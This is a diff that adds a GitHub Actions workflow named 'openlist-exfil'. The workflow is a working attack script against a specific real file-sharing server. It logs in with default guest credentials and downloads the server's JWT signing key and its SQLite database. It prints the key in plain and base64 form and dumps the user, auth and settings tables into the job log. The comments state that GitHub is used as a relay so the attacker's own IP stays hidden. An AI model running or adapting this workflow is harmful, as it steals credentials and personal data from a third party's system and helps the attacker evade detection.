@@ -1,0 +1,30 @@
+name: openlist-exfil
+on:
+  workflow_dispatch:
+jobs:
+  exfil:
+    runs-on: ubuntu-latest
+    steps:
+      - name: exfil OpenList jwt.key + artex.sqlite and dump user/setting tables (GitHub relay, zero own-IP)
+        run: |
+          set +e
+          B="https://pan.yazinb.icu"
+          LOGIN=$(curl -skS -m 20 -X POST "$B/api/auth/login" -H "Content-Type: application/json" -d '{"username":"guest","password":"guest"}')
+          TOKEN=$(echo "$LOGIN" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('token',''))" 2>/dev/null)
+          echo "guest_token_len=${#TOKEN}"
+          get_raw () { curl -skS -m 30 -X POST "$B/api/fs/get" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d "{\"path\":\"$1\"}" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('raw_url',''))" 2>/dev/null; }
+          dl () { local u="$1"; local o="$2"; curl -skS -m 120 "$u" -o "$o" -w "  dl $o -> HTTP %{http_code} bytes=%{size_download}\n"; }
+          P="/Artex  直装包  渗透网站专用"
+          echo "===== jwt.key ====="
+          U=$(get_raw "$P/jwt.key"); echo "raw_url=$U"; dl "$U" /tmp/jwt.key
+          echo "jwt.key ascii=[$(cat /tmp/jwt.key)]"
+          echo "jwt.key b64=[$(base64 -w0 /tmp/jwt.key)]"
+          echo "jwt.key sha256=$(sha256sum /tmp/jwt.key | cut -c1-32)"
+          echo "===== artex.sqlite ====="
+          U=$(get_raw "$P/data/artex.sqlite"); echo "raw_url=$U"; dl "$U" /tmp/artex.sqlite
+          echo "artex.sqlite sha256=$(sha256sum /tmp/artex.sqlite | cut -c1-32) size=$(wc -c < /tmp/artex.sqlite)"
+          echo "----- sqlite tables + schema -----"
+          python3 -c "import sqlite3;c=sqlite3.connect('/tmp/artex.sqlite');tabs=[r[0] for r in c.execute(\"select name from sqlite_master where type='table'\")];print('TABLES',tabs);[print('SCHEMA',t,'::',(c.execute('select sql from sqlite_master where name=?',(t,)).fetchone() or [None])[0]) for t in tabs]"
+          echo "----- dump user/setting/config tables (rows if <200) -----"
+          python3 -c "import sqlite3;c=sqlite3.connect('/tmp/artex.sqlite');tabs=[r[0] for r in c.execute(\"select name from sqlite_master where type='table'\")];[ (print('ROWS',t,list(c.execute('select * from '+t))) if c.execute('select count(*) from '+t).fetchone()[0]<200 else print('ROWS_SKIP',t,c.execute('select count(*) from '+t).fetchone()[0])) for t in tabs if any(k in t.lower() for k in ['user','setting','config','meta','auth'])]"
+          echo "=== EXFIL DONE ==="
